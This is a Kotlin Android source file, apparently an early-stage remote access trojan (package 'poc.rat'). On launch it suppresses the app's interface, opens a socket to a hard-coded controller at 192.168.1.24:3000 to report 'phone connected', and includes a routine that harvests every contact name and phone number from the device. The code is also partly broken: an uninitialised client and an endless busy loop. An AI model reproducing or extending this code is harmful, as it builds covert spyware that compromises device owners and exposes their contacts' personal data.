package poc.rat

import android.Manifest
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Bundle
import android.provider.ContactsContract
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket
import poc.rat.ui.theme.MyApplicationTheme

data class Contact(val name: String, val phone: String)

class MainActivity : AppCompatActivity() {
    private lateinit var client: OkHttpClient
    private val REQUEST_READ_CONTACTS = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        //enableEdgeToEdge()
        //setContent {
        //    MyApplicationTheme {
        //        Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
        //            Greeting(
        //                name = "Android",
        //                modifier = Modifier.padding(innerPadding)
        //            )
        //        }
        //    }
        //}

        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Create a socket connection to the server at IP 192.168.1.24 on port 3000
                val socket = Socket("192.168.1.24", 3000)

                // Create a writer to send data to the server
                val writer = PrintWriter(socket.getOutputStream(), true)
                // Create a reader to receive data from the server (if needed)
                val reader = BufferedReader(InputStreamReader(socket.getInputStream()))

                // Send a message to the server
                writer.println("phone connected")
                println("Message sent: phone connected")

                // Optionally, read a response from the server
                val response = reader.readLine()
                println("Received response: $response")

                // Clean up by closing the socket
                socket.close()
            } catch (e: Exception) {
                // Log the exception (use Log.e in production)
                e.printStackTrace()
            }
        }

        while (1 == 1) {}
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        if (requestCode == REQUEST_READ_CONTACTS) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                fetchContacts()
            } else {
                // Handle the case where permission is denied (e.g., show a message)
                println("Permission to read contacts was denied.")
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        }
    }

    // Function to fetch contacts from the device
    private fun fetchContacts() {
        val contactsList = mutableListOf<Contact>()

        // Query the contacts using the ContactsContract content provider
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            // Get the indices of the name and phone number columns
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            // Iterate through the results
            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val phone = it.getString(phoneIndex)
                contactsList.add(Contact(name, phone))
            }
        }

        // For demonstration purposes, print out the contacts
        contactsList.forEach { contact ->
            println("Name: ${contact.name}, Phone: ${contact.phone}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Shut down the OkHttp client to free resources when your Activity is destroyed.
        client.dispatcher.executorService.shutdown()
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    MyApplicationTheme {
        Greeting("Android")
    }
}
